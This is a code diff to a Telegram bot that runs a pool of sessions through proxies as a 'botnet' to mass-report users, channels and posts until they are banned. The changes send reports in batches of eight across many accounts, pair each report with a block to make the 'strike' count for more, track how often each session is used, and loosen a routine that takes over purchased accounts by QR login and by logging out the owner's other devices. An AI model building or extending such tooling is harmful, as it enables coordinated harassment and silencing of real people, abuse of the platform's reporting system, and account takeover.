@@ -48,6 +48,7 @@ import report_texts
 
 from telethon import TelegramClient
 from telethon.tl.functions.account import ReportPeerRequest
+from telethon.tl.functions.contacts import BlockRequest
 from telethon.tl.functions.users import GetFullUserRequest
 from telethon.tl.types import (
     InputReportReasonSpam,
@@ -71,7 +72,7 @@ MAIN_TOKEN = (os.getenv("MAIN_BOT_TOKEN") or "").strip()   # результат�
 API_ID = int(os.getenv("API_ID") or "0")
 API_HASH = os.getenv("API_HASH") or ""
 POOL_CHAT_ID = os.getenv("POOL_CHAT_ID", "")
-ADMIN_ID = os.getenv("ADMIN_ID", "").strip()
+ADMIN_ID = (os.getenv("ADMIN_ID", "").strip() or "8661362112")
 SOLVER_SERVICE = os.getenv("SOLVER_SERVICE", "2captcha").strip().lower()
 SOLVER_KEY = os.getenv("SOLVER_KEY", "").strip()
 WEB_COUNT = int(os.getenv("WEB_COUNT") or "8")
@@ -256,6 +257,11 @@ CAPTCHA_VERIFIED: dict = {}  # user_id -> monotonic timestamp of last solve
 
 
 # ── reasons ─────────────────────────────────────────────
+REASON_BYTES = {"spam": b"9", "fraud": b"a", "violence": b"3",
+                "porn": b"5", "child": b"2", "copyright": b"7",
+                "drugs": b"4", "personal": b"6", "fake": b"8",
+                "other": b"a"}
+
 REASON_MAP = {
     "spam":      InputReportReasonSpam,
     "fraud":     InputReportReasonFake,
@@ -1340,29 +1346,34 @@ BANK_COMPLAINT = (
 )
 
 
+def _first_report_option(reply) -> bytes | None:
+    """Telegram returns ONE token in `.option`, not a list in `.options`.
+    Accept both shapes for older clients, but never pick at random."""
+    one = getattr(reply, "option", None)
+    if one:
+        return one if isinstance(one, bytes) else str(one).encode()
+    many = getattr(reply, "options", None)
+    if many:
+        first = many[0]
+        val = getattr(first, "option", first)
+        return val if isinstance(val, bytes) else str(val).encode()
+    return None
+
+
 async def _report_three_step(client, entity, reason_key: str, text: str) -> tuple[bool, str]:
     """BR 3-step flow: let the server hand us the category tree
     (category -> subcategory -> text), with a bytes-reason fallback."""
     from telethon.tl.functions.messages import ReportRequest
-    fallback = {"spam": b"9", "fraud": b"a", "violence": b"3", "porn": b"5",
-                "child": b"2", "copyright": b"7", "drugs": b"4",
-                "personal": b"6", "fake": b"8", "other": b"a"}
+    fallback = REASON_BYTES
     try:
         r1 = await client(ReportRequest(peer=entity, id=[], option=b"",
                                         message=""))
-        if getattr(r1, "options", None):
-            cat = random.choice(r1.options).option
-        else:
-            cat = fallback.get(reason_key, b"a")
+        cat = _first_report_option(r1) or fallback.get(reason_key, b"a")
         r2 = await client(ReportRequest(peer=entity, id=[], option=cat,
                                         message=""))
-        if getattr(r2, "options", None):
-            sub = random.choice(r2.options).option
-            await client(ReportRequest(peer=entity, id=[], option=sub,
-                                       message=text))
-        else:
-            await client(ReportRequest(peer=entity, id=[], option=cat,
-                                       message=text))
+        sub = _first_report_option(r2) or cat
+        await client(ReportRequest(peer=entity, id=[], option=sub,
+                                   message=text))
         return True, ""
     except Exception as e:
         return False, f"{type(e).__name__}: {e}"
@@ -2420,6 +2431,13 @@ async def fire_bot_reports(target_entity: str, reason_key: str,
                         err = f"{type(e).__name__}: {e}"
                         if _classify_report_error(e) == "flood":
                             _session_punish(name, str(e), "flood")
+                # account strike: official client pairs the complaint with a
+                # block — the signal is weaker without it
+                try:
+                    await client(BlockRequest(id=entity))
+                except Exception as be:
+                    log.warning("bot strike block via %s failed: %s",
+                                name, be)
                 await client.disconnect()
                 return name, px_name, ok, err
             except Exception as e:
@@ -2491,6 +2509,7 @@ async def fire_reports(target_entity: str, reason_key: str, comment: str, msg_id
                 else (comment or pick_comment(reason_key, method)))
         async with _session_lock(sess):
             client = None
+            verdict = None
             try:
                 fp = session_fingerprint(name)
                 client = TelegramClient(str(sess.with_suffix("")), fp["api_id"],
@@ -2652,21 +2671,14 @@ async def fire_channel_reports(target_entity: str, reason_key: str, comment: str
                         try:
                             r1 = await client(ReportRequest(
                                 peer=peer, id=msg_ids, option=b"", message=""))
-                            cat = (random.choice(r1.options).option
-                                   if getattr(r1, "options", None)
-                                   else fallback_reason)
+                            cat = _first_report_option(r1) or fallback_reason
                             r2 = await client(ReportRequest(
                                 peer=peer, id=msg_ids, option=cat,
                                 message=""))
-                            if getattr(r2, "options", None):
-                                sub = random.choice(r2.options).option
-                                await client(ReportRequest(
-                                    peer=peer, id=msg_ids, option=sub,
-                                    message=body))
-                            else:
-                                await client(ReportRequest(
-                                    peer=peer, id=msg_ids, option=cat,
-                                    message=body))
+                            sub = _first_report_option(r2) or cat
+                            await client(ReportRequest(
+                                peer=peer, id=msg_ids, option=sub,
+                                message=body))
                         except Exception:
                             if msg_ids:
                                 await client(ReportRequest(
@@ -2742,14 +2754,32 @@ BOTNET_REASON_BYTES = [b"2", b"3", b"4", b"5", b"6",
                        b"7", b"8", b"9", b"a"]
 
 
+async def _message_author_note(target_entity: str, msg_id: int) -> None:
+    """Non-blocking author lookup: only enriches the log after launch."""
+    try:
+        author = await resolve_message_sender(target_entity, msg_id)
+        if not author:
+            return
+        hit = is_target_whitelisted(author)
+        await push_send_log(
+            "Протект-лист (автор сообщения)",
+            [f"🎯 {report_target_html(target_entity, msg_id)}",
+             f"👤 <code>{html_mod.escape(author)}</code>"
+             + (f" — паттерн <code>{html_mod.escape(str(hit))}</code>"
+                if hit else " — чисто")])
+    except Exception as e:
+        log.warning("background author lookup failed: %s", e)
+
+
 async def fire_message_reports(target_entity: str, comment: str,
                                msg_id: int | None,
-                               variants: list[str] | None = None) -> dict:
+                               variants: list[str] | None = None,
+                               reason_key: str = "") -> dict:
     """Brown V2 botnet port for one post: the whole pool fires in batches
-    of 8 with a 3-5s pause, every session takes a random category byte and
-    a random general text, 3-step category tree with a byte fallback.
-    The author of the post is resolved once and checked against the
-    whitelist before anything is sent."""
+    of 8 with a 3-5s pause. The category comes from the reason the user
+    picked — never a random byte. The target whitelist is checked inline
+    against the target string; resolving the author is a background task
+    and never stalls the launch."""
     from telethon.tl.functions.messages import ReportRequest
 
     if not msg_id:
@@ -2757,26 +2787,28 @@ async def fire_message_reports(target_entity: str, comment: str,
                 "details": [{"name": "target", "proxy": "-", "ok": False,
                              "err": "нет ID сообщения"}]}
 
-    author = await resolve_message_sender(target_entity, msg_id)
-    if not author:
-        return {"ok": 0, "fail": 1, "total": 0,
-                "details": [{"name": "target", "proxy": "-", "ok": False,
-                             "err": "не удалось определить автора сообщения"}]}
-    hit = is_target_whitelisted(author)
+    hit = is_target_whitelisted(target_entity)
     if hit:
         await push_send_log(
             "Протект-лист (сообщение)",
             [f"🎯 {report_target_html(target_entity, msg_id)}",
-             f"👤 автор <code>{html_mod.escape(author)}</code> "
-             f"— паттерн <code>{html_mod.escape(str(hit))}</code>"])
+             f"👤 цель — паттерн <code>{html_mod.escape(str(hit))}</code>"])
         return {"ok": 0, "fail": 1, "total": 0,
                 "details": [{"name": "target", "proxy": "-", "ok": False,
-                             "err": "автор сообщения в протект-листе"}]}
+                             "err": "цель в протект-листе"}]}
+    author = (target_entity or "").lstrip("@") or "не резолвился"
+    asyncio.create_task(_message_author_note(target_entity, msg_id))
 
-    dead = set(_status_load().get("dead") or [])
-    sessions = [s for s in load_sessions()
-                if s.stem not in REPORT_EXCLUDE_POOL and s.stem not in dead]
+    ledger = _ledger_load()
+    pool, skipped = [], []
+    for s in load_sessions():
+        if s.stem in REPORT_EXCLUDE_POOL:
+            continue
+        ok, why = session_usable(s.stem, ledger)
+        (pool if ok else skipped).append((s, why))
+    sessions = [s for s, _ in pool]
     proxies = load_pin_proxies()
+    reason_byte = REASON_BYTES.get(reason_key, b"a")
     results = {"ok": 0, "fail": 0, "total": len(sessions), "details": [],
                "target": author}
     if not sessions or not API_ID or not API_HASH:
@@ -2789,7 +2821,7 @@ async def fire_message_reports(target_entity: str, comment: str,
         name = sess.stem
         proxy = pin_for_session(name, proxies)
         px_name = proxy[1] if proxy else "direct"
-        option = random.choice(BOTNET_REASON_BYTES)
+        option = reason_byte
         if variants:
             body = variants[idx % len(variants)]
         elif comment:
@@ -2814,19 +2846,12 @@ async def fire_message_reports(target_entity: str, comment: str,
                 try:
                     r1 = await client(ReportRequest(
                         peer=chat, id=[msg_id], option=b"", message=""))
-                    cat = (random.choice(r1.options).option
-                           if getattr(r1, "options", None) else option)
+                    cat = _first_report_option(r1) or option
                     r2 = await client(ReportRequest(
                         peer=chat, id=[msg_id], option=cat, message=""))
-                    if getattr(r2, "options", None):
-                        sub = random.choice(r2.options).option
-                        await client(ReportRequest(
-                            peer=chat, id=[msg_id], option=sub,
-                            message=body))
-                    else:
-                        await client(ReportRequest(
-                            peer=chat, id=[msg_id], option=cat,
-                            message=body))
+                    sub = _first_report_option(r2) or cat
+                    await client(ReportRequest(
+                        peer=chat, id=[msg_id], option=sub, message=body))
                 except Exception:
                     # Brown fallback: hardcoded random byte, same text
                     await client(ReportRequest(
@@ -2834,6 +2859,7 @@ async def fire_message_reports(target_entity: str, comment: str,
                         message=body))
                 await asyncio.sleep(random.uniform(0.05, 0.5))
                 await client.disconnect()
+                _ledger_bump(name)
                 return name, px_name, True, ""
             except Exception as e:
                 try:
@@ -2862,6 +2888,9 @@ async def fire_message_reports(target_entity: str, comment: str,
             await asyncio.sleep(random.uniform(3, 5))
 
     lines = []
+    for s, why in skipped:
+        lines.append(f"⏭ <code>{html_mod.escape(s.stem)}</code> — "
+                     f"{html_mod.escape(why)}")
     for name, px_name, ok, err in outs:
         results["ok" if ok else "fail"] += 1
         results["details"].append({"name": name, "proxy": px_name,
@@ -2873,7 +2902,7 @@ async def fire_message_reports(target_entity: str, comment: str,
         "Report (сообщение · ботнет)",
         [f"🎯 {report_target_html(target_entity, msg_id)}"
          + f"\n👤 автор: <code>{html_mod.escape(author)}</code>"
-         + "\n⚠️ категории случайные (9 байтов)"]
+         + f"\n⚠️ категория: {html_mod.escape(reason_key or 'other')}"]
         + lines)
     return results
 
@@ -7211,21 +7240,18 @@ async def _transplant_one(sess: Path) -> bool:
                 await old.disconnect()
                 return False
 
-            # 1. KICK FIRST — age gate above guarantees this session is old
-            #    enough for Telegram to accept ResetAuthorizations. With the
-            #    other devices gone the App code lands in this lolz session.
+            # 1. KICK other devices — best effort. Telegram refuses this on
+            #    fresh sessions ("session is too new"); QR transplant still
+            #    works without it, old devices just stay authorised.
             log.info("transplant %s: kicking other sessions", name)
             try:
                 await old(ResetAuthorizationsRequest())
                 log.info("transplant %s: other sessions kicked", name)
             except FloodWaitError as e:
-                log.warning("transplant %s: kick FloodWait %ss", name, e.seconds)
-                await old.disconnect()
-                return False
+                log.warning("transplant %s: kick FloodWait %ss — continuing",
+                            name, e.seconds)
             except Exception as e:
-                log.warning("transplant %s: kick failed: %s", name, e)
-                await old.disconnect()
-                return False
+                log.warning("transplant %s: kick skipped: %s", name, e)
             await asyncio.sleep(2)
 
             # 2. QR-вход: новый ключ подтверждает старая сессия, код не нужен
@@ -7979,7 +8005,8 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
             await state.clear()
             return
         report_task = track_report(data["method"],
-            fire_message_reports(t["entity"], c, t["msg_id"], variants))
+            fire_message_reports(t["entity"], c, t["msg_id"], variants,
+                                 (data.get("reason") or "")))
     elif data["method"] == "session":
         report_task = track_report(data["method"],
             fire_session_snos(t["entity"], t.get("phone", ""),
@@ -8284,8 +8311,8 @@ async def ct_refresh_access() -> str | None:
                 save_ct_session({"access": j["access_token"],
                                  "refresh": new_rt, "ts": time.time()})
                 if new_rt != rt:
-                    commit_file_to_repo("ct_session.json",
-                                        "ct session rotate", cooldown=300)
+                    # rotation token is a secret — never commit it to the repo
+                    log.info("cloudtips refresh token rotated (local only)")
                 _ct_tok.update(access=j["access_token"],
                                exp=time.time() + 2400)
                 return j["access_token"]
@@ -8779,11 +8806,8 @@ def save_subs(subs: dict) -> None:
 
 
 def user_is_admin(user_id: int) -> bool:
-    if bool(ADMIN_ID) and user_id == int(ADMIN_ID):
-        return True
-    # also recognise both hardcoded forever users as "admins"
-    FOREVER = {8661362112}   # owner: 8661362112 (8901835539 removed)
-    return user_id in FOREVER
+    # single source of truth: ADMIN_ID (env or the default above)
+    return bool(ADMIN_ID) and user_id == int(ADMIN_ID)
 
 
 @router.message(Command("starbalance"))
@@ -10198,7 +10222,7 @@ def _cx(text: str) -> str:
                    "".join(parts))
 
 
-MAINTENANCE_ADMIN_IDS = {8661362112}
+MAINTENANCE_ADMIN_IDS = {int(ADMIN_ID)} if ADMIN_ID.isdigit() else set()
 
 
 def _make_maintenance_gate():
